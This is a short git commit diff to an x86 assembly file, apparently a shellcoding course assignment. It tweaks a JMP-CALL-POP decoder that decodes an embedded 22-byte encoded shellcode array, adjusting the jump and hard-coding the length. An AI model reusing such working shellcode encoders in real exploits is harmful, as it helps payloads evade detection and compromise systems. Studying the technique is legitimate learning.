e886a012aec1e9a925f20c6918e5a3d0a833ddee
amonsec <amonsec@protonmail.com>
2017-07-29 11:46:19 +0200

    Fix issue

--- assignment-4/decoder.asm
+++ assignment-4/decoder.asm
@@ -2,7 +2,7 @@ global _start
 
 section .text
 _start:
-    jmp starter             ; JMP CALL POP technique
+    jmp short starter             ; JMP CALL POP technique
 
 decoder:
     pop esi                 ; Store the shellcode in ESI
@@ -11,7 +11,7 @@ decoder:
     xor ebx, ebx            ; zeroed EBX
     xor ecx, ecx            ; zeroed ECX
 
-    mov byte cl, len        ; Lenght of shellcode
+    mov byte cl, 22         ; Lenght of shellcode
     mov byte al, 0x66       ; First value = 102
     mov byte bl, 0x2a       ; Key = 42
 
@@ -29,5 +29,3 @@ decode:
 starter:
     call decoder
     shellcode: db 0x3d, 0xd7, 0xad, 0x1e, 0x12, 0x80, 0xd9, 0x80, 0x1d, 0x8f, 0x1d, 0x44, 0xc8, 0x5b, 0xc3, 0x70, 0x7d, 0x07, 0xdd, 0xe8, 0x1f, 0xb5
-
-    len: equ $-shellcode
